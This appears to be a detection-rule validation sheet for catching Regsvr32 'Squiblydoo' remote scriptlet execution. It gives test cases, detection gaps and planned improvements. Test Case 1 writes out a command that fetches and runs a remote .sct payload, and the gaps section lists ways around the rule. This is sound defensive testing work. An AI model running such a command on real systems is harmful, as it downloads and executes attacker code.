# DET-009 Validation

## Objective

Validate detection of Regsvr32 remote script execution using the Squiblydoo technique.

---

## Test Environment

- Windows 11 VM
- Sysmon
- Wazuh Agent
- Wazuh Manager
- Splunk Enterprise
- Atomic Red Team

---

## Test Cases

### Test Case 1

Command:

regsvr32.exe /s /n /u /i:https://example.com/payload.sct scrobj.dll

Expected Result:

Detection generated.

---

### Test Case 2

Register a legitimate DLL.

Command:

regsvr32 legitimate.dll

Expected Result:

No detection.

---

### Test Case 3

Administrative COM registration.

Expected Result:

No detection.

---

### Test Case 4

Execute a complete attack chain using Certutil followed by Regsvr32.

Expected Result:

DET-007 and DET-009 correlation.

---

## Detection Gaps

Current limitations:

- Local scriptlets
- PowerShell-based execution
- Alternate LOLBins
- Custom script engines

---

## Future Improvements

- URL reputation
- Parent process analysis
- Process ancestry
- Scriptlet content inspection
- Behavioral scoring

---

## Conclusion

DET-009 detects abuse of Regsvr32 for remote script execution using the Squiblydoo technique. Because this behavior is uncommon in legitimate administration, alerts generated by this rule should be investigated with high priority.
